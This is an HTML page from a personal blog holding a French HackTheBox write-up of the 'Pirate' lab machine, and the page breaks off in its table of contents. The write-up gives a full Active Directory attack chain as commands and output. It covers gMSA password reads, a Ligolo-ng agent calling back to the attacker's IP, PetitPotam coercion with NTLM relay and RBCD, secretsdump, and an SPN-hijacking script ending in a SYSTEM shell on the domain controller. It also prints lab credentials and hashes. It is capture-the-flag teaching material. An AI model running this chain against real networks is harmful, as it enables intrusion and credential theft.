@@ -1,0 +1,1089 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Pirate - HackTheBox Writeup | keyll0ger</title>
+<meta name="keywords" content="HTB, Windows, Hard, Active Directory, Kerberos, NTLM Relay, RBCD, gMSA, SPN Hijacking">
+<meta name="description" content="OS: Windows Server 2019 | Difficulté: Hard | IP: 10.129.15.19 | Domain: pirate.htb
+Phase 1 - Reconnaissance Pourquoi commencer par un scan de ports ? Sur une machine Windows Hard, on s&rsquo;attend à un environnement Active Directory. Le scan révèle les services qui déterminent notre surface d&rsquo;attaque.
+Scan de ports nmap -Pn -p- --min-rate 5000 10.129.15.19 nmap -Pn -sCV -p 53,80,88,135,389,445,636,3268,5985,9389 10.129.15.19 Résultats clés :
+Port Service Info 53 DNS Simple DNS Plus 80 HTTP IIS 10.">
+<meta name="author" content="keyll0ger">
+<link rel="canonical" href="https://keyll0ger.github.io/posts/pirate/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://keyll0ger.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://keyll0ger.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://keyll0ger.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://keyll0ger.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://keyll0ger.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://keyll0ger.github.io/posts/pirate/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+  
+
+<meta property="og:title" content="Pirate - HackTheBox Writeup" />
+<meta property="og:description" content="OS: Windows Server 2019 | Difficulté: Hard | IP: 10.129.15.19 | Domain: pirate.htb
+Phase 1 - Reconnaissance Pourquoi commencer par un scan de ports ? Sur une machine Windows Hard, on s&rsquo;attend à un environnement Active Directory. Le scan révèle les services qui déterminent notre surface d&rsquo;attaque.
+Scan de ports nmap -Pn -p- --min-rate 5000 10.129.15.19 nmap -Pn -sCV -p 53,80,88,135,389,445,636,3268,5985,9389 10.129.15.19 Résultats clés :
+Port Service Info 53 DNS Simple DNS Plus 80 HTTP IIS 10." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://keyll0ger.github.io/posts/pirate/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2026-03-27T00:00:00+00:00" />
+<meta property="article:modified_time" content="2026-03-27T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Pirate - HackTheBox Writeup"/>
+<meta name="twitter:description" content="OS: Windows Server 2019 | Difficulté: Hard | IP: 10.129.15.19 | Domain: pirate.htb
+Phase 1 - Reconnaissance Pourquoi commencer par un scan de ports ? Sur une machine Windows Hard, on s&rsquo;attend à un environnement Active Directory. Le scan révèle les services qui déterminent notre surface d&rsquo;attaque.
+Scan de ports nmap -Pn -p- --min-rate 5000 10.129.15.19 nmap -Pn -sCV -p 53,80,88,135,389,445,636,3268,5985,9389 10.129.15.19 Résultats clés :
+Port Service Info 53 DNS Simple DNS Plus 80 HTTP IIS 10."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://keyll0ger.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Pirate - HackTheBox Writeup",
+      "item": "https://keyll0ger.github.io/posts/pirate/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Pirate - HackTheBox Writeup",
+  "name": "Pirate - HackTheBox Writeup",
+  "description": "OS: Windows Server 2019 | Difficulté: Hard | IP: 10.129.15.19 | Domain: pirate.htb\nPhase 1 - Reconnaissance Pourquoi commencer par un scan de ports ? Sur une machine Windows Hard, on s\u0026rsquo;attend à un environnement Active Directory. Le scan révèle les services qui déterminent notre surface d\u0026rsquo;attaque.\nScan de ports nmap -Pn -p- --min-rate 5000 10.129.15.19 nmap -Pn -sCV -p 53,80,88,135,389,445,636,3268,5985,9389 10.129.15.19 Résultats clés :\nPort Service Info 53 DNS Simple DNS Plus 80 HTTP IIS 10.",
+  "keywords": [
+    "HTB", "Windows", "Hard", "Active Directory", "Kerberos", "NTLM Relay", "RBCD", "gMSA", "SPN Hijacking"
+  ],
+  "articleBody": " OS: Windows Server 2019 | Difficulté: Hard | IP: 10.129.15.19 | Domain: pirate.htb\nPhase 1 - Reconnaissance Pourquoi commencer par un scan de ports ? Sur une machine Windows Hard, on s’attend à un environnement Active Directory. Le scan révèle les services qui déterminent notre surface d’attaque.\nScan de ports nmap -Pn -p- --min-rate 5000 10.129.15.19 nmap -Pn -sCV -p 53,80,88,135,389,445,636,3268,5985,9389 10.129.15.19 Résultats clés :\nPort Service Info 53 DNS Simple DNS Plus 80 HTTP IIS 10.0 (page par défaut) 88 Kerberos → confirme AD 389/636 LDAP/S Domain: pirate.htb 445 SMB Signing: Required 5985 WinRM Remote management 2179 vmrdp Hyper-V (indice réseau interne) Réflexion : C’est un Domain Controller (DC01.pirate.htb). Le port 2179 (Hyper-V vmrdp) est un indice crucial : le DC héberge probablement des VMs sur un réseau interne. Le SMB signing est required → pas de relay direct sur le DC.\nValidation des credentials nxc smb 10.129.15.19 -u 'pentest' -p 'p3nt3st2025!\u0026' # [+] pirate.htb\\pentest:p3nt3st2025!\u0026 Clock Skew # Le DC a +7h de décalage - critique pour Kerberos # Utiliser faketime pour toutes les opérations Kerberos faketime -f '+7h' Pourquoi c’est important ? Kerberos refuse les tickets si le décalage horaire dépasse 5 minutes. Sans faketime, toutes les opérations Kerberos échoueront avec KRB_AP_ERR_SKEW.\nPhase 2 - Enumération AD Pourquoi énumérer en profondeur ? Avec des credentials domain, on peut cartographier tout l’AD : users, groupes, permissions, délégations, ADCS. C’est cette cartographie qui révèle les chemins d’attaque.\nEnumération LDAP - Users ldapsearch -x -H ldap://10.129.15.19 -D 'pentest@pirate.htb' -w 'p3nt3st2025!\u0026' \\ -b 'DC=pirate,DC=htb' '(objectClass=user)' \\ sAMAccountName memberOf description userAccountControl Users découverts :\nUser Groupes UAC Notes Administrator Domain Admins 66048 Cible finale a.white Domain Users 66048 Angela White a.white_adm IT 16843264 TRUSTED_TO_AUTH_FOR_DELEGATION, SPN: ADFS/a.white j.sparrow Domain Users 66048 Jack Sparrow pentest Domain Users 66048 Notre user Comptes machine intéressants :\nAccount Groupes UAC Notes MS01$ Domain Secure Servers 4128 PASSWD_NOTREQD, Pre-Win2000 EXCH01$ Pre-Win2000 4128 PASSWD_NOTREQD WEB01$ Domain Computers 4096 SPNs HTTP, tapinego gMSA (Group Managed Service Accounts) :\nAccount Groupes Notes gMSA_ADCS_prod$ Remote Management Users Service ADCS gMSA_ADFS_prod$ Remote Management Users SPN: host/adfs.pirate.htb Pourquoi MS01$ et EXCH01$ sont intéressants ? userAccountControl: 4128 = WORKSTATION_TRUST_ACCOUNT (4096) + PASSWD_NOTREQD (32). Combiné avec l’appartenance au groupe Pre-Windows 2000 Compatible Access, ces comptes ont probablement un mot de passe = nom de machine en lowercase.\nBloodHound faketime -f '+7h' bloodhound-python -u 'pentest' -p 'p3nt3st2025!\u0026' \\ -d pirate.htb -ns 10.129.15.19 -c All --zip Chemins d’attaque identifiés :\na.white --[ForceChangePassword]--\u003e a.white_adm IT group --[WriteSPN]--\u003e DC01$, WEB01$, MS01$, EXCH01$ a.white_adm --[Constrained Delegation]--\u003e HTTP/WEB01.pirate.htb Domain Secure Servers --[ReadGMSAPassword]--\u003e gMSA_ADCS_prod$, gMSA_ADFS_prod$ Kerberoast faketime -f '+7h' impacket-GetUserSPNs 'pirate.htb/pentest:p3nt3st2025!\u0026' \\ -dc-ip 10.129.15.19 -request -outputfile kerberoast.txt Hash récupéré pour a.white_adm (SPN: ADFS/a.white) mais non cracké avec rockyou + rules. Le password est trop fort.\nADCS faketime -f '+7h' certipy find -u 'pentest@pirate.htb' -p 'p3nt3st2025!\u0026' \\ -dc-ip 10.129.15.19 -stdout CA: pirate-DC01-CA sur DC01 Template ADFSSSLSigning : EnrolleeSuppliesSubject=True, EKU=Server Auth, Enroll=Domain Computers MachineAccountQuota: 10 Phase 3 - Pre-Windows 2000 → gMSA → WinRM sur DC Pourquoi tester les comptes Pre-Win2000 ? C’est une faille classique en AD. Quand un admin crée un compte machine en mode “Pre-Windows 2000 compatible”, le password par défaut est le nom de la machine en lowercase sans le $. Si personne ne l’a changé, on a les creds.\nTest des credentials machines nxc smb 10.129.15.19 -u 'MS01$' -p 'ms01' # STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT → password CORRECT ! nxc smb 10.129.15.19 -u 'EXCH01$' -p 'exch01' # STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT → password CORRECT ! Pourquoi STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT = succès ? Cette erreur signifie que l’authentification a réussi mais que le type de compte (WORKSTATION_TRUST) n’est pas autorisé pour un logon SMB interactif. Le password est validé.\nPourquoi MS01$ est critique ? MS01$ est dans le groupe Domain Secure Servers qui a le droit ReadGMSAPassword sur gMSA_ADCS_prod$ et gMSA_ADFS_prod$. Ces gMSA sont dans Remote Management Users → WinRM sur le DC.\nLecture du gMSA via Kerberos Problème : Les comptes WORKSTATION_TRUST ne peuvent pas faire de simple LDAP bind (erreur 710). Il faut utiliser Kerberos.\n# Obtenir un TGT pour MS01$ faketime -f '+7h' impacket-getTGT 'pirate.htb/MS01$:ms01' -dc-ip 10.129.15.19 export KRB5CCNAME=MS01\\$.ccache # Lire le gMSA password via bloodyAD en Kerberos faketime -f '+7h' bloodyAD -d pirate.htb -u 'MS01$' -p 'ms01' \\ --host DC01.pirate.htb -k get object 'gMSA_ADCS_prod$' --attr msDS-ManagedPassword # msDS-ManagedPassword.NT: 25c7f0eb586ed3a91375dbf2f6e4a3ea faketime -f '+7h' bloodyAD -d pirate.htb -u 'MS01$' -p 'ms01' \\ --host DC01.pirate.htb -k get object 'gMSA_ADFS_prod$' --attr msDS-ManagedPassword # msDS-ManagedPassword.NT: fd9ea7ac7820dba5155bd6ed2d850c09 WinRM sur le DC evil-winrm -i 10.129.15.19 -u 'gMSA_ADCS_prod$' -H '25c7f0eb586ed3a91375dbf2f6e4a3ea' On est sur le DC ! Mais en tant que gMSA, pas admin. Medium Plus integrity, pas de SeDebugPrivilege.\nDécouverte du réseau interne ipconfig /all # Ethernet adapter vEthernet (Switch01): # IPv4 Address: 192.168.100.1 # Ethernet adapter Ethernet0 2: # IPv4 Address: 10.129.15.19 Le DC est dual-homed ! Interface interne 192.168.100.1 (Hyper-V). WEB01 est sur ce subnet.\nPhase 4 - Pivot réseau interne avec Ligolo-ng Pourquoi Ligolo-ng ? On doit accéder au réseau interne 192.168.100.0/24 depuis notre machine. Ligolo-ng crée un tunnel VPN-like performant via un agent sur le DC.\nSetup Ligolo-ng # Sur notre machine - créer l'interface TUN sudo ip tuntap add user $(whoami) mode tun ligolo sudo ip link set ligolo up sudo ip route add 192.168.100.0/24 dev ligolo # Lancer le proxy ./ligolo-ng_proxy_0.8.3_linux_amd64 -selfcert -laddr 0.0.0.0:11601 Upload et lancement de l’agent sur le DC # Dans evil-winrm upload /tmp/ligolo-ng_agent_0.8.3_windows_amd64.exe C:\\temp\\agent.exe C:\\temp\\agent.exe -connect 10.10.17.198:11601 -ignore-cert Activation du tunnel # Dans la console Ligolo session # Sélectionner l'agent DC01 start ATTENTION : Si l’agent se reconnecte, la route disparaît. Il faut la remettre :\nsudo ip route add 192.168.100.0/24 dev ligolo Scan du réseau interne nmap -Pn -p 445,80,135,5985 192.168.100.0/24 # 192.168.100.1 → DC01 (déjà connu) # 192.168.100.2 → WEB01 (HTTP:80, SMB:445, WinRM:5985) Vérification SMB signing nxc smb 192.168.100.2 # (signing:False) → PARFAIT pour le relay NTLM ! Phase 5 - NTLM Relay + RBCD sur WEB01 Pourquoi le relay NTLM ? WEB01 a SMB signing disabled. On peut forcer WEB01 à s’authentifier (coercion) puis relayer cette auth vers le LDAP du DC pour effectuer des actions en tant que WEB01$.\nPourquoi Shadow Credentials a échoué ? [-] Could not modify object, the server reports insufficient rights WEB01$ n’a pas le droit de modifier son propre msDS-KeyCredentialLink via relay LDAP. Mais RBCD fonctionne car WEB01$ peut écrire msDS-AllowedToActOnBehalfOfOtherIdentity sur lui-même.\nSetup de l’attaque Terminal 1 - ntlmrelayx (arrêter Responder d’abord) :\nsudo impacket-ntlmrelayx -t ldap://192.168.100.1 --remove-mic \\ --delegate-access -smb2support Pourquoi --remove-mic ? Le Message Integrity Code (MIC) protège normalement contre le relay. Ce flag le supprime pour permettre le relay LDAP.\nPourquoi --delegate-access ? ntlmrelayx va automatiquement :\nCréer un nouveau compte machine Configurer RBCD sur WEB01$ pour que ce compte puisse impersonner des users Terminal 2 - PetitPotam (coercion) :\npython3 PetitPotam.py -d pirate.htb -u pentest -p 'p3nt3st2025!\u0026' \\ 10.10.17.198 192.168.100.2 Résultat :\n[+] Attack worked! [*] Authenticating against ldap://192.168.100.1 as PIRATE/WEB01$ SUCCEED [*] Adding new computer with username: LPQQLPUC$ and password: eCWqO6GJrjvDqy} result: OK [*] Delegation rights modified succesfully! [*] LPQQLPUC$ can now impersonate users on WEB01$ via S4U2Proxy S4U2Proxy → Admin local WEB01 # Obtenir un ticket CIFS/WEB01 en tant qu'Administrator faketime -f '+7h' impacket-getST -spn 'cifs/WEB01.pirate.htb' \\ -impersonate Administrator -dc-ip 192.168.100.1 \\ 'pirate.htb/LPQQLPUC$:eCWqO6GJrjvDqy}' # Ajouter WEB01 au hosts echo '192.168.100.2 WEB01.pirate.htb WEB01' | sudo tee -a /etc/hosts # SYSTEM shell ou dump secrets export KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache faketime -f '+7h' impacket-smbexec -k -no-pass 'pirate.htb/Administrator@WEB01.pirate.htb' Dump des secrets WEB01 faketime -f '+7h' impacket-secretsdump -k -no-pass \\ 'pirate.htb/Administrator@WEB01.pirate.htb' -use-vss Résultat critique dans les LSA Secrets :\n[*] DefaultPassword PIRATE\\a.white:E2nvAOKSz5Xz2MJu Pourquoi DefaultPassword ? WEB01 est configuré avec un autologon Windows pour a.white. Le password est stocké en clair dans le registre HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DefaultPassword et extrait par secretsdump via les LSA Secrets.\nPhase 6 - a.white → a.white_adm → Domain Admin ForceChangePassword # Valider les creds de a.white nxc smb 10.129.15.19 -u 'a.white' -p 'E2nvAOKSz5Xz2MJu' -d pirate.htb # a.white a ForceChangePassword sur a.white_adm (vu dans BloodHound) source /etc/Certipy/certipy-venv/bin/activate bloodyAD -d pirate.htb -u 'a.white' -p 'E2nvAOKSz5Xz2MJu' \\ --host 10.129.15.19 set password 'a.white_adm' 'Hacked123!' # [+] Password changed successfully! Pourquoi ForceChangePassword ? Cet ACL AD permet de reset le password d’un user sans connaître l’ancien. C’est différent de “Change Password” qui nécessite l’ancien password.\nSPN Hijacking Rappel de la situation :\na.white_adm a Constrained Delegation vers HTTP/WEB01.pirate.htb a.white_adm est dans le groupe IT qui a WriteSPN sur DC01$ L’idée : Déplacer le SPN HTTP/WEB01.pirate.htb de WEB01$ vers DC01$. Quand on demandera un ticket via KCD pour ce SPN, le KDC chiffrera le ticket avec la clé de DC01$ (puisque le SPN est maintenant sur DC01). On pourra ensuite réécrire le service en CIFS/DC01.pirate.htb et le DC acceptera le ticket.\nScript de SPN Hijacking #!/usr/bin/env python3 \"\"\"spn_hijack.py - Move HTTP/WEB01.pirate.htb from WEB01$ to DC01$\"\"\" import ldap3 server = ldap3.Server('ldap://10.129.15.19') conn = ldap3.Connection(server, 'pirate.htb\\\\a.white_adm', 'Hacked123!', authentication=ldap3.NTLM, auto_bind=True) print(f'[+] Bound as: {conn.extend.standard.who_am_i()}') # Remove HTTP/WEB01.pirate.htb from WEB01$ conn.modify('CN=WEB01,CN=Computers,DC=pirate,DC=htb', {'servicePrincipalName': [(ldap3.MODIFY_DELETE, ['HTTP/WEB01.pirate.htb'])]}) print(f'[*] Remove SPN from WEB01$: {conn.result[\"description\"]}') # Remove HTTP/WEB01 too (short form) conn.modify('CN=WEB01,CN=Computers,DC=pirate,DC=htb', {'servicePrincipalName': [(ldap3.MODIFY_DELETE, ['HTTP/WEB01'])]}) print(f'[*] Remove SPN HTTP/WEB01 from WEB01$: {conn.result[\"description\"]}') # Add HTTP/WEB01.pirate.htb to DC01$ conn.modify('CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb', {'servicePrincipalName': [(ldap3.MODIFY_ADD, ['HTTP/WEB01.pirate.htb'])]}) print(f'[*] Add SPN to DC01$: {conn.result[\"description\"]}') python3 spn_hijack.py # [+] Bound as: u:PIRATE\\a.white_adm # [*] Remove SPN from WEB01$: success # [*] Remove SPN HTTP/WEB01 from WEB01$: success # [*] Add SPN to DC01$: success KCD + Alt-Service → Domain Admin # 1. Obtenir un TGT frais pour a.white_adm faketime -f '+7h' impacket-getTGT 'pirate.htb/a.white_adm:Hacked123!' -dc-ip 10.129.15.19 # 2. S4U2Self + S4U2Proxy avec alt-service export KRB5CCNAME=a.white_adm.ccache faketime -f '+7h' impacket-getST \\ -spn 'HTTP/WEB01.pirate.htb' \\ -impersonate Administrator \\ -dc-ip 10.129.15.19 \\ -k -no-pass \\ -altservice 'CIFS/DC01.pirate.htb' \\ 'pirate.htb/a.white_adm' # [*] Saving ticket in Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache # 3. SYSTEM shell sur le DC export KRB5CCNAME=Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache faketime -f '+7h' impacket-psexec -k -no-pass 'pirate.htb/Administrator@DC01.pirate.htb' Pourquoi -altservice ? Le ticket S4U2Proxy est chiffré avec la clé du service cible. Puisqu’on a déplacé le SPN HTTP/WEB01.pirate.htb sur DC01$, le ticket est chiffré avec la clé de DC01$. En réécrivant le nom de service en CIFS/DC01.pirate.htb, le DC accepte le ticket car :\nIl est chiffré avec sa propre clé (valide) Le nom de service CIFS est accepté pour l’accès fichier/admin Le ticket impersonne Administrator → SYSTEM ! Root Flag C:\\Windows\\system32\u003e type C:\\Users\\Administrator\\Desktop\\root.txt 785f845ea1967d0c434cd350f1468ad1 Kill Chain Visuel ┌─────────────────────────────────────────┐ │ pentest (Domain User) │ │ p3nt3st2025!\u0026 │ └──────────────────┬──────────────────────┘ │ Pre-Windows 2000 │ password = machine name ┌──────────────────▼──────────────────────┐ │ MS01$ (password: ms01) │ │ Groupe: Domain Secure Servers │ └──────────────────┬──────────────────────┘ │ ReadGMSAPassword │ (via Kerberos TGT + bloodyAD -k) ┌──────────────────▼──────────────────────┐ │ gMSA_ADCS_prod$ │ │ NTLM: 25c7f0eb586ed3a91375dbf2f6e4a3ea │ │ Remote Management Users → WinRM DC01 │ └──────────────────┬──────────────────────┘ │ evil-winrm → ipconfig │ Découverte 192.168.100.0/24 ┌──────────────────▼──────────────────────┐ │ Ligolo-ng Pivot │ │ Agent sur DC01 → Tunnel vers interne │ │ WEB01 découvert à 192.168.100.2 │ │ SMB signing: DISABLED │ └──────────────────┬──────────────────────┘ │ PetitPotam coercion │ + ntlmrelayx → LDAP relay │ + RBCD (delegate-access) ┌──────────────────▼──────────────────────┐ │ WEB01$ - RBCD configuré │ │ LPQQLPUC$ → S4U2Proxy → Admin WEB01 │ │ secretsdump -use-vss │ │ LSA Secret: a.white:E2nvAOKSz5Xz2MJu │ └──────────────────┬──────────────────────┘ │ ForceChangePassword ┌──────────────────▼──────────────────────┐ │ a.white_adm (IT group) │ │ Constrained Delegation: HTTP/WEB01 │ │ IT → WriteSPN sur DC01$ │ └──────────────────┬──────────────────────┘ │ SPN Hijacking │ HTTP/WEB01 → move to DC01$ │ KCD + altservice → CIFS/DC01 ┌──────────────────▼──────────────────────┐ │ DOMAIN ADMIN │ │ psexec → SYSTEM on DC01 │ │ root.txt: 785f845ea1967d0c434cd350... │ └─────────────────────────────────────────┘ Scripts Custom gmsa_dump.py #!/usr/bin/env python3 \"\"\"Read gMSA passwords using MS01$ machine account via NTLM auth\"\"\" import ldap3 import hashlib import struct DC_IP = '10.129.15.19' DOMAIN = 'pirate.htb' USERNAME = 'MS01$' PASSWORD = 'ms01' def extract_ntlm_from_managed_password(blob): \"\"\"Extract NTLM hash from msDS-ManagedPassword blob\"\"\" current_pwd_offset = struct.unpack('",
+  "wordCount" : "2520",
+  "inLanguage": "en",
+  "datePublished": "2026-03-27T00:00:00Z",
+  "dateModified": "2026-03-27T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "keyll0ger"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://keyll0ger.github.io/posts/pirate/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "keyll0ger",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://keyll0ger.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://keyll0ger.github.io/" accesskey="h" title="keyll0ger (Alt + H)">keyll0ger</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://keyll0ger.github.io/posts/" title="Writeups">
+                    <span>Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://keyll0ger.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://keyll0ger.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://keyll0ger.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://keyll0ger.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://keyll0ger.github.io/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Pirate - HackTheBox Writeup
+    </h1>
+    <div class="post-meta"><span title='2026-03-27 00:00:00 +0000 UTC'>March 27, 2026</span>&nbsp;·&nbsp;12 min&nbsp;·&nbsp;keyll0ger
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#phase-1---reconnaissance" aria-label="Phase 1 - Reconnaissance">Phase 1 - Reconnaissance</a><ul>
+                        
+                <li>
+                    <a href="#pourquoi-commencer-par-un-scan-de-ports-" aria-label="Pourquoi commencer par un scan de ports ?">Pourquoi commencer par un scan de ports ?</a></li>
+                <li>
+                    <a href="#scan-de-ports" aria-label="Scan de ports">Scan de ports</a></li>
+                <li>
+                    <a href="#validation-des-credentials" aria-label="Validation des credentials">Validation des credentials</a></li>
+                <li>
+                    <a href="#clock-skew" aria-label="Clock Skew">Clock Skew</a></li></ul>
+                </li>
+                <li>
+                    <a href="#phase-2---enum%c3%a9ration-ad" aria-label="Phase 2 - Enumération AD">Phase 2 - Enumération AD</a><ul>
+                        
+                <li>
+                    <a href="#pourquoi-%c3%a9num%c3%a9rer-en-profondeur-" aria-label="Pourquoi énumérer en profondeur ?">Pourquoi énumérer en profondeur ?</a></li>
+                <li>
+                    <a href="#enum%c3%a9ration-ldap---users" aria-label="Enumération LDAP - Users">Enumération LDAP - Users</a></li>
+                <li>
+                    <a href="#pourquoi-ms01-et-exch01-sont-int%c3%a9ressants-" aria-label="Pourquoi MS01$ et EXCH01$ sont intéressants ?">Pourquoi MS01$ et EXCH01$ sont intéressants ?</a></li>
+                <li>
+                    <a href="#bloodhound" aria-label="BloodHound">BloodHound</a></li>
+                <li>
+                    <a href="#kerberoast" aria-label="Kerberoast">Kerberoast</a></li>
+                <li>
+                    <a href="#adcs" aria-label="ADCS">ADCS</a></li></ul>
+                </li>
+                <li>
+                    <a href="#phase-3---pre-windows-2000--gmsa--winrm-sur-dc" aria-label="Phase 3 - Pre-Windows 2000 → gMSA → WinRM sur DC">Phase 3 - Pre-Windows 2000 → gMSA → WinRM sur DC</a><ul>
+                        
+                <li>
+                    <a href="#pourquoi-tester-les-comptes-pre-win2000-" aria-label="Pourquoi tester les comptes Pre-Win2000 ?">Pourquoi tester les comptes Pre-Win2000 ?</a></li>
+                <li>
+                    <a href="#test-des-credentials-machines" aria-label="Test des credentials machines">Test des credentials machines</a></li>
+                <li>
+                    <a href="#pourquoi-ms01-est-critique-" aria-label="Pourquoi MS01$ est critique ?">Pourquoi MS01$ est critique ?</a></li>
+                <li>
+                    <a href="#lecture-du-gmsa-via-kerberos" aria-label="Lecture du gMSA via Kerberos">Lecture du gMSA via Kerberos</a></li>
+                <li>
+                    <a href="#winrm-sur-le-dc" aria-label="WinRM sur le DC">WinRM sur le DC</a></li>
+                <li>
+                    <a href="#d%c3%a9couverte-du-r%c3%a9seau-interne" aria-label="Découverte du réseau interne">Découverte du réseau interne</a></li></ul>
+                </li>
+                <li>
+                    <a href="#phase-4---pivot-r%c3%a9seau-interne-avec-ligolo-ng" aria-label="Phase 4 - Pivot réseau interne avec Ligolo-ng">Phase 4 - Pivot réseau interne avec Ligolo-ng</a><ul>
+                        
+                <li>
+                    <a href="#pourquoi-ligolo-ng-" aria-label="Pourquoi Ligolo-ng ?">Pourquoi Ligolo-ng ?</a></li>
+                <li>
+                    <a href="#setup-ligolo-ng" aria-label="Setup Ligolo-ng">Setup Ligolo-ng</a></li>
+                <li>
+                    <a href="#upload-et-lancement-de-lagent-sur-le-dc" aria-label="Upload et lancement de l&rsquo;agent sur le DC">Upload et lancement de l&rsquo;agent sur le DC</a></li>
+                <li>
+                    <a href="#activation-du-tunnel" aria-label="Activation du tunnel">Activation du tunnel</a></li>
+                <li>
+                    <a href="#scan-du-r%c3%a9seau-interne" aria-label="Scan du réseau interne">Scan du réseau interne</a></li>
+                <li>
+                    <a href="#v%c3%a9rification-smb-signing" aria-label="Vérification SMB signing">Vérification SMB signing</a></li></ul>
+                </li>
+                <li>
+                    <a href="#phase-5---ntlm-relay--rbcd-sur-web01" aria-label="Phase 5 - NTLM Relay &#43; RBCD sur WEB01">Phase 5 - NTLM Relay + RBCD sur WEB01</a><ul>
+                        
+                <li>
+                    <a href="#pourquoi-le-relay-ntlm-" aria-label="Pourquoi le relay NTLM ?">Pourquoi le relay NTLM ?</a></li>
+                <li>
+                    <a href="#pourquoi-shadow-credentials-a-%c3%a9chou%c3%a9-" aria-label="Pourquoi Shadow Credentials a échoué ?">Pourquoi Shadow Credentials a échoué ?</a></li>
+                <li>
+                    <a href="#setup-de-lattaque" aria-label="Setup de l&rsquo;attaque">Setup de l&rsquo;attaque</a></li>
+                <li>
+                    <a href="#s4u2proxy--admin-local-web01" aria-label="S4U2Proxy → Admin local WEB01">S4U2Proxy → Admin local WEB01</a></li>
+                <li>
+                    <a href="#dump-des-secrets-web01" aria-label="Dump des secrets WEB01">Dump des secrets WEB01</a></li></ul>
+                </li>
+                <li>
+                    <a href="#phase-6---awhite--awhite_adm--domain-admin" aria-label="Phase 6 - a.white → a.white_adm → Domain Admin">Phase 6 - a.white → a.white_adm → Domain Admin</a><ul>
+                        
+                <li>
+                    <a href="#forcechangepassword" aria-label="ForceChangePassword">ForceChangePassword</a></li>
+                <li>
+                    <a href="#spn-hijacking" aria-label="SPN Hijacking">SPN Hijacking</a></li>
+                <li>
+                    <a href="#script-de-spn-hijacking" aria-label="Script de SPN Hijacking">Script de SPN Hijacking</a></li>
+                <li>
